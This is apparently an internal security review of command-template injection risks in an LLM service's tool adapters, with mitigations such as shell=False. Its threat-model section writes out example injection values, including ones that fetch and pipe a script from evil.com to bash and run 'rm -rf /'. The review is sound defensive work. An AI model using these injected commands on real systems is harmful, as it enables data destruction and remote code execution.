# Command Template Security Review
## LLM Service Layer - Milestone 2 Preparation

**Date:** 2026-02-04  
**Author:** Architect Alphonso  
**Time Box:** 30 minutes  
**Purpose:** Assess command template injection risks and recommend mitigations for M2  
**Status:** Security Posture Review (MVP Scope)

---

## Executive Summary

**Security Posture:** ✅ **ACCEPTABLE FOR MVP** (trusted YAML configuration)

**Current Risk Level:** 🟢 **LOW** - YAML configuration is admin-controlled

**Key Finding:** Command injection risk is **mitigated by trusted configuration source**. M2 implementation should use `subprocess` with `shell=False` and proper argument handling.

**Recommendation:** Implement secure subprocess execution patterns in M2. Document security assumptions for future hardening.

---

## Context

### Problem Statement

Tool adapters in Milestone 2 will execute external commands using templates defined in YAML configuration:

```yaml
# tools.yaml
tools:
  claude-code:
    binary: claude
    command_template: '{binary} --prompt-file {prompt_file} --model {model} --output {output_file}'
    models: ['claude-sonnet-20240229', 'claude-haiku-20240307']
```

The adapter substitutes placeholders with runtime values:

```python
# Adapter code (M2)
command_str = template.format(
    binary='claude',
    prompt_file='/tmp/prompt.txt',
    model='claude-sonnet-20240229',
    output_file='/tmp/output.txt'
)
# Result: "claude --prompt-file /tmp/prompt.txt --model claude-sonnet-20240229 --output /tmp/output.txt"

subprocess.run(command_str.split(), ...)  # Execute command
```

**Security Question:** Can malicious values in YAML or runtime parameters lead to command injection?

---

## Threat Model

### Attack Vectors

#### Vector 1: Malicious Command Template in YAML

**Scenario:** Attacker modifies `tools.yaml` to inject shell commands

```yaml
# Malicious tools.yaml
tools:
  malicious-tool:
    binary: 'curl http://evil.com && echo'
    command_template: '{binary} {prompt_file}; rm -rf /'  # Shell injection
    models: ['any']
```

**Risk Assessment:**
- **Likelihood:** 🟢 **LOW** - Requires admin/filesystem access to modify YAML
- **Impact:** 🔴 **CRITICAL** - Arbitrary command execution on host
- **Current Mitigation:** YAML is admin-controlled, not user input
- **M2 Mitigation:** Use `subprocess` with `shell=False` (list of args, not string)

#### Vector 2: Injection via Model Name

**Scenario:** Attacker provides malicious model name via API/CLI

```python
# Malicious model name
model = "claude-sonnet'; rm -rf /; echo 'pwned"

# Command becomes:
# claude --model claude-sonnet'; rm -rf /; echo 'pwned --output ...
```

**Risk Assessment:**
- **Likelihood:** 🟡 **MEDIUM** - If model name comes from user input (not M2 scope)
- **Impact:** 🔴 **CRITICAL** - Arbitrary command execution
- **Current Mitigation:** Model names validated against `tools.yaml` (Pydantic schema)
- **M2 Mitigation:** Subprocess with `shell=False` prevents shell interpretation

#### Vector 3: Injection via Prompt/Output File Paths

**Scenario:** Attacker provides malicious file paths

```python
# Malicious prompt file
prompt_file = "/tmp/prompt.txt; curl http://evil.com | bash"

# Command becomes:
# claude --prompt-file /tmp/prompt.txt; curl http://evil.com | bash --model ...
```

**Risk Assessment:**
- **Likelihood:** 🟡 **MEDIUM** - If paths come from user input (M2 scope)
- **Impact:** 🔴 **CRITICAL** - Arbitrary command execution
- **Current Mitigation:** None (M1 doesn't execute tools)
- **M2 Mitigation:** Subprocess with `shell=False` + path validation

#### Vector 4: Malicious Binary Path

**Scenario:** Attacker modifies YAML to point to malicious binary

```yaml
# Malicious tools.yaml
tools:
  fake-claude:
    binary: '/tmp/evil-script.sh'  # Malicious binary
    command_template: '{binary} {prompt_file}'
```

**Risk Assessment:**
- **Likelihood:** 🟢 **LOW** - Requires admin access to modify YAML
- **Impact:** 🔴 **CRITICAL** - Arbitrary code execution
- **Current Mitigation:** YAML is admin-controlled
- **M2 Mitigation:** Validate binary path (whitelist known binaries)

---

## Current Security Posture (Milestone 1)

### Secure by Design Factors

1. ✅ **Trusted Configuration Source**
   - YAML files are admin-controlled (not user input)
   - Stored in local filesystem with appropriate permissions
   - No API endpoint for modifying tool configuration

2. ✅ **Schema Validation (Pydantic)**
   - Model names validated against `tools.yaml`
   - Tool references validated (must exist in config)
   - Invalid configurations rejected at load time

3. ✅ **No Command Execution Yet**
   - M1 only validates routing, doesn't execute tools
   - Injection risk deferred to M2 implementation

### Residual Risks (M1 → M2 Transition)

1. ⚠️ **Command Template Not Validated**
   - No validation of placeholders in `command_template`
   - No sanitization of substituted values
   - Shell metacharacters not escaped

2. ⚠️ **Binary Path Not Validated**
   - No check that binary exists or is executable
   - No whitelist of allowed binaries
   - Path could point to malicious script

3. ⚠️ **Future Risk: User-Editable Configuration**
   - If YAML becomes user-editable (web UI, API), all vectors become HIGH likelihood
   - Current trust boundary may shift in future versions

---

## Mitigation Strategy for Milestone 2

### Recommendation 1: Use `subprocess` with `shell=False` ✅ **CRITICAL**

**Implementation:**

```python
# SECURE: List of arguments, no shell interpretation
command = [
    self.tool_config.binary,          # 'claude'
    '--prompt-file', prompt_file,      # '/tmp/prompt.txt'
    '--model', model,                  # 'claude-sonnet-20240229'
    '--output', output_file            # '/tmp/output.txt'
]
result = subprocess.run(command, shell=False, capture_output=True, check=True)

# INSECURE: String command with shell=True
command_str = f"{binary} --prompt-file {prompt_file} --model {model}"
result = subprocess.run(command_str, shell=True)  # ❌ VULNERABLE TO INJECTION
```

**Why This Works:**
- `shell=False` prevents shell interpretation of metacharacters (`;`, `|`, `&&`, `$()`)
- Arguments passed as list elements are treated as literal strings
- Even if `model='claude; rm -rf /'`, it's passed as literal argument to binary (not shell)

**Priority:** 🔴 **CRITICAL** - Must be implemented in M2 Batch 2.1

### Recommendation 2: Validate File Paths ✅ **HIGH**

**Implementation:**

```python
def validate_file_path(path: str) -> str:
    """Validate and normalize file path."""
    # Resolve to absolute path
    abs_path = Path(path).resolve()
    
    # Check path traversal attempts
    if '..' in path:
        raise ValidationError(f"Path traversal not allowed: {path}")
    
    # Ensure parent directory exists
    if not abs_path.parent.exists():
        raise ValidationError(f"Parent directory does not exist: {abs_path.parent}")
    
    return str(abs_path)


# In adapter execute():
prompt_file = validate_file_path(prompt_file)
output_file = validate_file_path(output_file)
```

**Priority:** 🟠 **HIGH** - Should be implemented in M2 Batch 2.1

### Recommendation 3: Whitelist Command Template Placeholders ✅ **MEDIUM**

**Implementation:**

```python
# In ToolConfig validation (schemas.py)
@field_validator('command_template')
@classmethod
def validate_template_placeholders(cls, v):
    """Ensure only allowed placeholders in template."""
    allowed_placeholders = {'{binary}', '{prompt_file}', '{model}', '{output_file}'}
    
    # Extract placeholders from template
    import re
    found_placeholders = set(re.findall(r'\{[^}]+\}', v))
    
    # Check for unknown placeholders
    unknown = found_placeholders - allowed_placeholders
    if unknown:
        raise ValueError(f"Unknown placeholders in command_template: {unknown}")
    
    return v
```

**Priority:** 🟡 **MEDIUM** - Can be added in M2 or M3

### Recommendation 4: Binary Path Validation ✅ **LOW** (MVP)

**Implementation:**

```python
def validate_binary(binary: str) -> str:
    """Validate binary path exists and is executable."""
    # Check if binary is in PATH
    if shutil.which(binary):
        return binary
    
    # Check if absolute path to executable
    binary_path = Path(binary)
    if binary_path.exists() and binary_path.is_file():
        if not os.access(binary_path, os.X_OK):
            raise ValidationError(f"Binary not executable: {binary}")
        return str(binary_path)
    
    raise ValidationError(f"Binary not found: {binary}")


# In adapter initialization:
self.binary = validate_binary(self.tool_config.binary)
```

**Priority:** 🟢 **LOW** for MVP (nice-to-have)  
**Rationale:** Admin-controlled YAML means binary paths are trusted

---

## Security Assumptions (MVP Scope)

### Assumptions for M2 MVP

1. ✅ **YAML Configuration is Admin-Controlled**
   - Configuration files stored in local filesystem
   - No API endpoint for modifying tool configuration
   - File permissions restrict write access to admins

2. ✅ **Local Machine Usage Only**
   - LLM Service runs on user's local machine
   - Not deployed as shared service accessible to untrusted users
   - No multi-tenant security requirements

3. ✅ **Prompt/Output Files are Local**
   - File paths provided by trusted automation (not external users)
   - No web upload of prompt files (out of scope for MVP)

### Threat Boundary

**TRUSTED:**
- YAML configuration files (tools.yaml, agents.yaml, models.yaml)
- Binary paths in tool configuration
- Filesystem where service runs

**UNTRUSTED:**
- None in MVP scope (all inputs are admin/automation-controlled)

**FUTURE CONSIDERATIONS:**
- If YAML becomes user-editable → HIGH RISK (re-evaluate all vectors)
- If service exposed as API → CRITICAL RISK (multi-tenant isolation required)
- If prompt files come from web upload → MEDIUM RISK (path validation critical)

---

## Risk Assessment Matrix

| Threat Vector | Likelihood (MVP) | Impact | Risk Level | M2 Mitigation |
|---------------|------------------|--------|------------|---------------|
| Malicious command_template | 🟢 LOW | 🔴 CRITICAL | 🟢 **LOW** | `shell=False` |
| Model name injection | 🟢 LOW | 🔴 CRITICAL | 🟢 **LOW** | Schema validation + `shell=False` |
| File path injection | 🟡 MEDIUM | 🔴 CRITICAL | 🟡 **MEDIUM** | Path validation |
| Malicious binary path | 🟢 LOW | 🔴 CRITICAL | 🟢 **LOW** | Trusted YAML |

**Overall MVP Risk:** 🟢 **LOW** (acceptable for local, admin-controlled usage)

---

## Implementation Checklist for M2

### Must-Have (Batch 2.1)
- ✅ Use `subprocess.run()` with `shell=False`
- ✅ Pass command as list of arguments, not string
- ✅ Validate model name against tool config (already in M1)
- ✅ Document security assumptions in adapter base class

### Should-Have (Batch 2.1 or 2.2)
- ⚠️ Validate and normalize file paths
- ⚠️ Check for path traversal attempts (`..` in paths)
- ⚠️ Document threat model in architecture docs

### Nice-to-Have (M3 or later)
- 💡 Whitelist command template placeholders
- 💡 Validate binary path exists and is executable
- 💡 Log command execution for audit trail
- 💡 Add security section to configuration documentation

---

## Future Hardening (Post-MVP)

### If YAML Becomes User-Editable

**Risk Level:** 🔴 **CRITICAL**

**Required Mitigations:**
1. **Strict Input Validation**
   - Whitelist allowed binary paths
   - Validate command_template format (no shell metacharacters)
   - Sanitize all placeholders before substitution

2. **Sandboxing**
   - Run tool execution in restricted environment (containers, VMs)
   - Limit filesystem access (read-only config, isolated temp dirs)
   - Network isolation (no outbound connections during execution)

3. **Audit Logging**
   - Log all tool executions (command, user, timestamp)
   - Alert on suspicious patterns (multiple failures, unusual binaries)

### If Service Exposed as API

**Risk Level:** 🔴 **CRITICAL**

**Required Mitigations:**
- All "user-editable YAML" mitigations (above)
- Multi-tenant isolation (separate config namespaces)
- Authentication and authorization (who can execute what tools)
- Rate limiting and quota enforcement
- Input validation on all API parameters

---

## Conclusion

**Current Security Posture:** ✅ **ACCEPTABLE FOR MVP**

**Key Findings:**
1. ✅ Trusted YAML configuration mitigates most injection risks
2. ✅ Using `subprocess` with `shell=False` is critical and sufficient for M2
3. ⚠️ File path validation should be added in M2 (defense in depth)
4. 🟢 Binary path validation is nice-to-have but not critical for MVP

**Recommendation for M2:**
- **Implement `subprocess` with `shell=False`** in Batch 2.1 (critical)
- **Add file path validation** in Batch 2.1 or 2.2 (high priority)
- **Document security assumptions** in adapter base class
- **Defer advanced hardening** to post-MVP (not blocking for M2)

**Next Steps:**
1. Include security implementation guidance in ADR-029 (adapter interface)
2. Add subprocess security patterns to adapter base class
3. Document threat model in `docs/architecture/security/threat-model.md` (M3)

---

**Prepared By:** Architect Alphonso  
**Date:** 2026-02-04  
**Time Box:** 30 minutes (completed)  
**Status:** Security posture assessed, M2 recommendations provided  
**Risk Level:** 🟢 LOW (MVP acceptable, hardening path documented)
